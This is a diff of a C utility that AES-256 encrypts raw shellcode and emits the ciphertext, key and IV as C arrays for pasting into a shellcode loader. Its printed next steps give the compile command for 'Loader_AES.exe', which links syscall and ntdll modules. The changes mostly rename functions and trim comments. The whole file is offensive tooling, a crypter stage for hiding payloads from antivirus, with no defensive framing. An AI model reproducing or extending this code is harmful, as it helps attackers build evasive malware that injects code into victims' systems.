@@ -3,7 +3,6 @@
  * PAYLOAD ENCRYPTION UTILITY
  * 
  * Author: 28Zaakypro@proton.me
- * Date: 2025-11-13
  * 
  * This tool encrypts a shellcode file using AES-256-CBC encryption.
  * It generates random key and IV, then outputs:
@@ -20,19 +19,13 @@
  * Example:
  * encrypt_payload.exe ../payload/shellcode.bin
  * 
- * OUTPUT:
- * Creates 3 files in ../payload/:
- *   - shellcode_aes.bin (encrypted shellcode)
- *   - shellcode_aes.txt (C array format for copy/paste)
- *   - key_iv.txt (key and IV in C array format)
- * 
  */
 
 #include "../modules/crypto.h"
 #include <stdio.h>
 #include <stdlib.h>
 
-void PrintUsage(const char *progName)
+void Usage_(const char *progName)
 {
     printf("Usage: %s <shellcode_file>\n", progName);
     printf("\n");
@@ -42,13 +35,13 @@ void PrintUsage(const char *progName)
     printf("  %s ../payload/shellcode.bin\n", progName);
     printf("\n");
     printf("Output files:\n");
-    printf("  - ../payload/shellcode_aes.bin (encrypted binary)\n");
-    printf("  - ../payload/shellcode_aes.txt (C array format)\n");
-    printf("  - ../payload/key_iv.txt (key and IV)\n");
+    printf("  - ../payload/shellcode_aes.bin\n");
+    printf("  - ../payload/shellcode_aes.txt\n");
+    printf("  - ../payload/key_iv.txt\n");
     printf("\n");
 }
 
-BOOL ReadFile_Custom(const char *filename, BYTE **data, SIZE_T *size)
+BOOL ReadFile_(const char *filename, BYTE **data, SIZE_T *size)
 {
     FILE *f = fopen(filename, "rb");
     if (!f)
@@ -93,7 +86,7 @@ BOOL ReadFile_Custom(const char *filename, BYTE **data, SIZE_T *size)
     return TRUE;
 }
 
-BOOL WriteFile_Custom(const char *filename, const BYTE *data, SIZE_T size)
+BOOL WriteFile_(const char *filename, const BYTE *data, SIZE_T size)
 {
     FILE *f = fopen(filename, "wb");
     if (!f)
@@ -114,7 +107,7 @@ BOOL WriteFile_Custom(const char *filename, const BYTE *data, SIZE_T size)
     return TRUE;
 }
 
-void WriteCArrayToFile(const char *filename, const char *varName, const BYTE *data, SIZE_T size)
+void WriteCArrayToFile_(const char *filename, const char *varName, const BYTE *data, SIZE_T size)
 {
     FILE *f = fopen(filename, "w");
     if (!f)
@@ -149,7 +142,7 @@ int main(int argc, char *argv[])
 {
     if (argc != 2)
     {
-        PrintUsage(argv[0]);
+        Usage_(argv[0]);
         return EXIT_FAILURE;
     }
 
@@ -161,7 +154,7 @@ int main(int argc, char *argv[])
     BYTE *plainShellcode = NULL;
     SIZE_T shellcodeSize = 0;
 
-    if (!ReadFile_Custom(inputFile, &plainShellcode, &shellcodeSize))
+    if (!ReadFile_(inputFile, &plainShellcode, &shellcodeSize))
     {
         return EXIT_FAILURE;
     }
@@ -175,7 +168,7 @@ int main(int argc, char *argv[])
     printf("\n\n");
 
     // STEP 2: GENERATE RANDOM KEY AND IV
-    printf("[*] Generating random AES-256 key and IV...\n");
+    printf("[*] Generating random AES key and IV...\n");
 
     BYTE key[AES_256_KEY_SIZE];
     BYTE iv[AES_IV_SIZE];
@@ -232,7 +225,7 @@ int main(int argc, char *argv[])
     printf("[*] Saving encrypted shellcode...\n");
 
     // Binary file
-    if (!WriteFile_Custom("payload/shellcode_aes.bin", encryptedShellcode, encryptedSize))
+    if (!WriteFile_("payload/shellcode_aes.bin", encryptedShellcode, encryptedSize))
     {
         free(plainShellcode);
         free(encryptedShellcode);
@@ -240,8 +233,8 @@ int main(int argc, char *argv[])
     }
     printf("[+] Binary saved: payload/shellcode_aes.bin\n");
 
-    // C array file (for easy copy/paste into loader.c)
-    WriteCArrayToFile("payload/shellcode_aes.txt", "encryptedShellcode", encryptedShellcode, encryptedSize);
+    // C array file (for easy copy/paste)
+    WriteCArrayToFile_("payload/shellcode_aes.txt", "encryptedShellcode", encryptedShellcode, encryptedSize);
 
     // STEP 5: SAVE KEY AND IV
     printf("[*] Saving key and IV...\n");
@@ -284,11 +277,10 @@ int main(int argc, char *argv[])
     printf("Next steps:\n");
     printf("  1. Copy contents of ../payload/shellcode_aes.txt into loader_v3.c\n");
     printf("  2. Copy key and IV from ../payload/key_iv.txt into loader_v3.c\n");
-    printf("  3. Update DecryptAndInject() to use DecryptPayload() instead of XOR\n");
-    printf("  4. Compile loader with: gcc -O0 loader_v3.c modules/*.c modules/dosyscall.o -o output/Loader_AES.exe -ladvapi32 -lntdll -luser32\n");
+    printf("  3. Compile loader with: gcc -O0 loader_v3.c modules/*.c modules/dosyscall.o -o output/Loader_AES.exe -ladvapi32 -lntdll -luser32\n");
     printf("\n");
 
-    // Cleanup
+    // Cleanu
     SecureZeroMemory(plainShellcode, shellcodeSize);
     SecureZeroMemory(encryptedShellcode, encryptedSize);
     SecureZeroMemory(key, AES_256_KEY_SIZE);
